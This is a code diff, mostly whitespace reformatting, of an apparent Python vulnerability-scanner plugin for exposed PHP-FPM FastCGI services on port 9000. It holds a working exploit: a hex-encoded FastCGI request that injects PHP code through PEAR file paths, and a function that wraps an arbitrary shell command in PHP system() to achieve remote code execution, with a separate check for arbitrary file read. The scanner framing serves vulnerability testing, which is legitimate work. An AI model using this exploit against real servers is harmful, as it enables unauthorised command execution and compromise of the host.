@@ -3,8 +3,10 @@
 import socket
 import time
 
+
 def bin2str(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
+
 
 exp_payload_base = bin2str("""
 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00
@@ -19,7 +21,7 @@ exp_payload_base = bin2str("""
 75 74 0f 17 53 43 52 49 50 54 5f 46 49 4c 45 4e
 41 4d 45
 """) + '{path}' \
-+ bin2str("""
+    + bin2str("""
 0d 01 44 4f 43 55
 4d 45 4e 54 5f 52 4f 4f 54 2f 0f 10 53 45 52 56
 45 52 5f 53 4f 46 54 57 41 52 45 67 6f 20 2f 20
@@ -29,11 +31,11 @@ exp_payload_base = bin2str("""
 4f 4c 48 54 54 50 2f 31 2e 31 0e 02 43 4f 4e 54
 45 4e 54 5f 4c 45 4e 47 54 48
 """) + '{data_length}' \
-+ bin2str("""
+    + bin2str("""
 00 00 00 00
 01 04 00 01 00 00 00 00 01 05 00 01 00 47 01 00
 """) + '{php_code}' \
-+ bin2str("""
+    + bin2str("""
 00
 """)
 
@@ -52,53 +54,56 @@ poc_payload = bin2str('''
 ''')
 
 phpfile_list = [
-# '/usr/share/php/Archive/Tar.php',
-# '/usr/share/php/Console/Getopt.php',
-'/usr/share/php/OS/Guess.php',
-'/usr/share/php/PEAR.php',
-# '/usr/share/php/PEAR/Autoloader.php',
-# '/usr/share/php/PEAR/Builder.php',
-# '/usr/share/php/PEAR/Command.php',
-# '/usr/share/php/PEAR/Common.php',
-# '/usr/share/php/PEAR/Config.php',
-# '/usr/share/php/PEAR/Installer.php',
-# '/usr/share/php/PEAR/Packager.php',
-# '/usr/share/php/PEAR/REST.php',
-# '/usr/share/php/PEAR/Validate.php',
-# '/usr/share/php/PEAR/XMLParser.php',
-# '/usr/share/php/Structures/Graph.php',
-# '/usr/share/php/Structures/Graph/Node.php',
-# '/usr/share/php/System.php',
-# '/usr/share/php/XML/Util.php',
-# '/usr/share/php/pearcmd.php'
+    # '/usr/share/php/Archive/Tar.php',
+    # '/usr/share/php/Console/Getopt.php',
+    '/usr/share/php/OS/Guess.php',
+    '/usr/share/php/PEAR.php',
+    # '/usr/share/php/PEAR/Autoloader.php',
+    # '/usr/share/php/PEAR/Builder.php',
+    # '/usr/share/php/PEAR/Command.php',
+    # '/usr/share/php/PEAR/Common.php',
+    # '/usr/share/php/PEAR/Config.php',
+    # '/usr/share/php/PEAR/Installer.php',
+    # '/usr/share/php/PEAR/Packager.php',
+    # '/usr/share/php/PEAR/REST.php',
+    # '/usr/share/php/PEAR/Validate.php',
+    # '/usr/share/php/PEAR/XMLParser.php',
+    # '/usr/share/php/Structures/Graph.php',
+    # '/usr/share/php/Structures/Graph/Node.php',
+    # '/usr/share/php/System.php',
+    # '/usr/share/php/XML/Util.php',
+    # '/usr/share/php/pearcmd.php'
 ]
+
 
 def get_plugin_info():
     plugin_info = {
-        "name":"fastcgi任意文件读取及远程任意代码执行",
-        "info":"可以通过fast-cgi获取文件或任意代码执行",
-        "level":"高危",
-        "type":"代码执行",
-        "author":"nearg1e@YSRC",
-        "source":1,
-        "url":"http://www.cnblogs.com/LittleHann/p/4561462.html",
-        "keyword":"port:9000"
+        "name": "fastcgi任意文件读取及远程任意代码执行",
+        "info": "可以通过fast-cgi获取文件或任意代码执行",
+        "level": "高危",
+        "type": "代码执行",
+        "author": "nearg1e@YSRC",
+        "source": 1,
+        "url": "http://www.cnblogs.com/LittleHann/p/4561462.html",
+        "keyword": "port:9000"
     }
     return plugin_info
 
+
 def send_socket(host, port, timeout, waittime=1, payload=''):
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.setdefaulttimeout(timeout)
-    sock.connect((host,port))
+    sock.connect((host, port))
     sock.send(payload)
     time.sleep(waittime)
     res = sock.recv(1024)
     return res
 
+
 def fast_cgi_rce(host, port, php_filepath='', commond=''):
     php_code = "<?php die(md5('ysrc@neargle'));?>"
     if commond:
-        php_code = "<?php system('%s'); die(hex('ysrc@neargle'));?>" %commond
+        php_code = "<?php system('%s'); die(hex('ysrc@neargle'));?>" % commond
 
     exp_payload = exp_payload_base.format(
         path=php_filepath, data_length=str(len(php_code)),
@@ -110,12 +115,14 @@ def fast_cgi_rce(host, port, php_filepath='', commond=''):
         return (True, res)
     return False
 
+
 def exploit(host, port):
     for filepath in phpfile_list:
         res = fast_cgi_rce(host, port, php_filepath=filepath)
         if res:
             return (True, u'存在任意代码执行漏洞,php文件路径：' + filepath)
     return False
+
 
 def verify(host, port):
     info = ''
@@ -124,6 +131,7 @@ def verify(host, port):
         info = u'存在fastcgi任意文件读取漏洞'
         return (True, info)
     return False
+
 
 def check(host, port, timeout):
     info = ''
@@ -138,6 +146,7 @@ def check(host, port, timeout):
             return info
     except Exception as e:
         pass
+
 
 if __name__ == '__main__':
     print(check('127.0.0.1', 9000, timeout=10))
